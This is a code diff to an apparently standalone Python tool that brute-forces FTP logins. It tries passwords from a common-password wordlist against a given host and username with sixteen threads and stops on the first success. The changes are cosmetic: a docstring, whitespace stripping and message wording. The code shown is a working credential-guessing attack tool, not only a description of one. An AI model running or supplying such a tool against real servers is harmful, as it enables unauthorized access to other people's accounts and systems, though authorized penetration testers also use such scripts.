@@ -13,6 +13,9 @@ import concurrent.futures
 
 
 def ftp_login(host, username, password):
+    """
+    Try to login to the FTP server with the given credentials
+    """
     try:
         with ftplib.FTP(host) as ftp:
             ftp.login(username, password)
@@ -31,8 +34,7 @@ if __name__ == '__main__':
         print("\nPlease move the file '10k-most-common.txt' into the correct directory")
         sys.exit(1)
 
-    print(
-        f'Starting threaded FTP bruteforce on {host} with account : {username}')
+    print(f'Starting threaded FTP bruteforce on {host} with account: {username}')
     start_time = time.time()
 
     with open(wordlist, 'r') as f:
@@ -41,14 +43,15 @@ if __name__ == '__main__':
         with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
             futures = []
             for password in passwords:
-                print(f"Trying Login : {password.strip()}")
+                password = password.strip()
+                print(f"Trying Login : {password}")
                 futures.append(executor.submit(
-                    ftp_login, host, username, password.strip()))
+                    ftp_login, host, username, password))
 
             for future in concurrent.futures.as_completed(futures):
                 if future.result():
                     executor.shutdown(wait=False)
                     sys.exit(0)
 
-    print('Password Not Found')
-    print(f"Time taken : {time.time() - start_time}")
+    print('Password not found')
+    print(f"Time taken : {time.time() - start_time}s")
